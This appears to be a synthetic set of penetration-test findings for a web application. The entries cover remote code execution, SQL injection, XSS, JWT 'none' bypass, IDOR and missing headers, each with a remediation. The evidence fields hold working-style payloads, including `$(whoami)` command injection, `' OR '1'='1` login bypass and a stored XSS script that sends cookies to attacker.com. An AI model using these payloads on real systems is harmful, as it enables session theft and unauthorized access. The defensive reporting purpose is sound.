findings.title: Unauthenticated Remote Code Execution in API Gateway
findings.description: Remote code execution vulnerability in routing middleware allows unauthenticated attackers to execute shell commands.
findings.evidence: POST /api/v2/gateway/exec with payload `$(whoami)` returns root response.
findings.recommendation: Update API Gateway middleware to version 4.2.1 and sanitize all request parameters.
findings.impact: Total server compromise and full system administrative takeover.

findings.title: Broken Object Level Authorization in Billing API
findings.description: Users can view and download invoices belonging to other customer accounts by tampering with invoice numbers.
findings.evidence: GET /api/v1/billing/invoices/9941 returned invoice details for corporate account 104.
findings.recommendation: Enforce tenant authorization policy check on invoice object IDs.
findings.impact: Confidential financial information leak and regulatory non-compliance.

findings.title: Weak JWT Signature Algorithm Allowed
findings.description: The authentication server accepts JWT tokens signed with 'none' algorithm.
findings.evidence: Submitting token with header {"alg":"none"} bypasses signature verification.
findings.recommendation: Explicitly restrict accepted JWT algorithms to RS256 or HS256.
findings.impact: Authentication bypass for arbitrary user identity claims.

findings.title: SQL Injection in Authentication Service
findings.description: SQL Injection in username parameter allows full authentication bypass.
findings.evidence: Payload `' OR '1'='1` submitted to login form.
findings.recommendation: Implement prepared statements with parameterized queries.
findings.impact: Unauthorized administrator access and database control.

findings.title: Cross-Site Scripting in User Profile
findings.description: Stored XSS vulnerability in profile bio field.
findings.evidence: Payload `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`.
findings.recommendation: Implement contextual HTML entity encoding and Content-Security-Policy.
findings.impact: Client-side session hijacking and credential theft.

findings.title: Insecure Direct Object Reference (IDOR)
findings.description: IDOR allows unauthorized access to private document records.
findings.evidence: Changing document_id from 1094 to 1095 retrieves another user's file.
findings.recommendation: Implement server-side authorization checks for object ownership.
findings.impact: Exposure of sensitive user documents and private financial records.

findings.title: Missing Security Response Headers
findings.description: Missing Strict-Transport-Security (HSTS) and X-Frame-Options headers.
findings.evidence: Response headers missing Strict-Transport-Security and X-Frame-Options.
findings.recommendation: Configure Nginx / Apache to include required security headers.
findings.impact: Vulnerable to clickjacking and downgrade attacks over unencrypted channels.

findings.title: Outdated Component with Known CVEs
findings.description: Legacy JavaScript library (Bootstrap 3.3.7) detected with known XSS CVE.
findings.evidence: HTML script tag referencing bootstrap 3.3.7.
findings.recommendation: Upgrade Bootstrap to version 5.3+.
findings.impact: Potential minor cross-site scripting under specific conditions.

findings.title: SQL Injection
findings.description: The application appears to directly include user-supplied input in a database query without sufficient parameterization or input validation.
findings.evidence: The parameter "user_id" accepts SQL metacharacters and produces database-related error responses.
findings.recommendation: Use parameterized queries or prepared statements.

findings.title: Cross-Site Scripting (XSS)
findings.description: User-controlled search input is reflected in the application's response without adequate output encoding.
findings.evidence: The search parameter is reflected into the HTML response without proper HTML encoding.
findings.recommendation: Apply context-aware output encoding and validate user input.

findings.title: Missing Security Headers
findings.description: Several recommended HTTP security headers are missing from the application responses.
findings.evidence: Missing Content-Security-Policy, X-Content-Type-Options, and Strict-Transport-Security.
findings.recommendation: Configure the application to send appropriate security headers.

findings.title: Weak Password Policy
findings.description: The application allows users to create passwords that do not meet a sufficiently strong password policy.
findings.evidence: Passwords shorter than recommended minimum lengths were accepted during testing.
findings.recommendation: Enforce a stronger password policy and encourage long, unique passwords.

findings.evidence: The response includes the application framework name and version.
findings.recommendation: Remove unnecessary software version information from publicly accessible responses.
